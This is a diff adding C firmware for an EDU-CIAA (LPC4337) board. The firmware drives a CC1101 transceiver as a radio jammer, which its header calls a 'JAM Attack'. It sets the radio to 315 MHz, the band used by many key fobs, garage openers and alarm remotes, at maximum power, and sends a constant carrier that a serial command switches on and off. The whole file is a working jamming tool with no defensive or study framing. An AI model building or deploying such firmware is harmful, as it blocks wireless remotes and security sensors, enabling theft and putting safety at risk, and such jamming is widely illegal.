@@ -1,0 +1,145 @@
+/*
+ * CC1101 JAM Attack - EDU-CIAA con sAPI
+ */
+
+#include "chip.h"
+#include "sapi.h"
+
+// --- Mapeo de Pines ---
+// Pin 16 JP2 = TXD1 = P1_20 del LPC4337 = GPIO0[15]
+#define CC1101_CS_SCU_PORT 1
+#define CC1101_CS_SCU_PIN 20
+#define CC1101_CS_GPIO_PORT 0
+#define CC1101_CS_GPIO_PIN 15
+
+// Pin 32 JP2 = GPIO1 = P0_0 del LPC4337 = GPIO0[0]
+#define CC1101_GDO0_SCU_PORT 6
+#define CC1101_GDO0_SCU_PIN 4
+#define CC1101_GDO0_GPIO_PORT 3
+#define CC1101_GDO0_GPIO_PIN 3
+
+// Registros CC1101
+#define CC1101_IOCFG0 0x02
+#define CC1101_PKTCTRL0 0x08
+#define CC1101_FREQ2 0x0D
+#define CC1101_FREQ1 0x0E
+#define CC1101_FREQ0 0x0F
+#define CC1101_MDMCFG2 0x12
+#define CC1101_MCSM0 0x18
+#define CC1101_PATABLE 0x3E
+
+// Strobes
+#define CC1101_SRES 0x30
+#define CC1101_SCAL 0x33
+#define CC1101_STX 0x35
+
+const float freq = 315;
+
+// Prototipos
+void initCustomGPIO(void);
+void setCS(bool_t state);
+void setGDO0(bool_t state);
+void writeReg(uint8_t addr, uint8_t value);
+void sendStrobe(uint8_t strobe);
+void resetCC1101(void);
+void configureCC1101ForJam(float frequency);
+void setFrequency(float freqMHz);
+
+void initCustomGPIO(void) {
+  // Configurar CS (P1_20)
+  Chip_SCU_PinMuxSet(CC1101_CS_SCU_PORT, CC1101_CS_SCU_PIN,
+                     (SCU_MODE_INACT | SCU_MODE_FUNC0));
+  Chip_GPIO_SetPinDIROutput(LPC_GPIO_PORT, CC1101_CS_GPIO_PORT,
+                            CC1101_CS_GPIO_PIN);
+  setCS(TRUE);
+
+  // Configurar GDO0 (P0_0)
+  Chip_SCU_PinMuxSet(CC1101_GDO0_SCU_PORT, CC1101_GDO0_SCU_PIN,
+                     (SCU_MODE_INACT | SCU_MODE_FUNC0));
+  Chip_GPIO_SetPinDIROutput(LPC_GPIO_PORT, CC1101_GDO0_GPIO_PORT,
+                            CC1101_GDO0_GPIO_PIN);
+  setGDO0(FALSE);
+}
+
+void setCS(bool_t state) {
+  Chip_GPIO_SetPinState(LPC_GPIO_PORT, CC1101_CS_GPIO_PORT, CC1101_CS_GPIO_PIN,
+                        state);
+}
+
+void setGDO0(bool_t state) {
+  Chip_GPIO_SetPinState(LPC_GPIO_PORT, CC1101_GDO0_GPIO_PORT,
+                        CC1101_GDO0_GPIO_PIN, state);
+}
+
+void writeReg(uint8_t addr, uint8_t value) {
+  uint8_t buffer[2] = {addr, value};
+  setCS(FALSE);
+  delayInaccurateUs(10);
+  spiWrite(SPI0, buffer, 2);
+  setCS(TRUE);
+}
+
+void sendStrobe(uint8_t strobe) {
+  setCS(FALSE);
+  delayInaccurateUs(10);
+  spiWrite(SPI0, &strobe, 1);
+  setCS(TRUE);
+}
+
+void setFrequency(float freqMHz) {
+  // Cálculo: FREQ = (f_carrier * 2^16) / f_oscilador (26MHz)
+  uint32_t freq_reg = (uint32_t)((freqMHz * 65536.0) / 26.0);
+
+  writeReg(CC1101_FREQ2, (freq_reg >> 16) & 0xFF);
+  writeReg(CC1101_FREQ1, (freq_reg >> 8) & 0xFF);
+  writeReg(CC1101_FREQ0, freq_reg & 0xFF);
+}
+
+void configureCC1101ForJam(float frequency) {
+  sendStrobe(CC1101_SRES);
+  delay(10);
+
+  writeReg(CC1101_IOCFG0, 0x0D); // GDO0 define activación de señal portadora
+
+  setFrequency(frequency); // Configuración de frecuencia
+
+  writeReg(CC1101_MDMCFG2, 0x32);  // Modulación ASK
+  writeReg(CC1101_PKTCTRL0, 0x32); // Modo Asíncrono Serial
+  writeReg(CC1101_MCSM0, 0x18);    // Auto-calibración
+  writeReg(CC1101_PATABLE, 0xC0);  // Potencia máxima
+
+  sendStrobe(CC1101_SCAL);
+  delay(10);
+}
+
+int main(void) {
+  boardConfig();
+  uartConfig(UART_USB, 115200);
+  initCustomGPIO();
+  spiConfig(SPI0);
+
+  uartWriteString(UART_USB, "Configurando CC1101 a 315 MHz...\r\n");
+  configureCC1101ForJam(freq);
+
+  // Iniciar modo transmisión
+  sendStrobe(CC1101_STX);
+
+  // GDO0 en HIGH = Emitiendo portadora constantemente
+  setGDO0(TRUE);
+
+  uartWriteString(UART_USB, "JAM ACTIVO\r\n");
+
+  uint8_t key;
+  while (1) {
+    if (uartReadByte(UART_USB, &key)) {
+      if (key == '0') {
+        uartWriteString(UART_USB, "JAM INACTIVO\r\n");
+        setGDO0(FALSE);
+      } else if (key == '1') {
+        uartWriteString(UART_USB, "JAM ACTIVO\r\n");
+        setGDO0(TRUE);
+      }
+    }
+  }
+  return 0;
+}
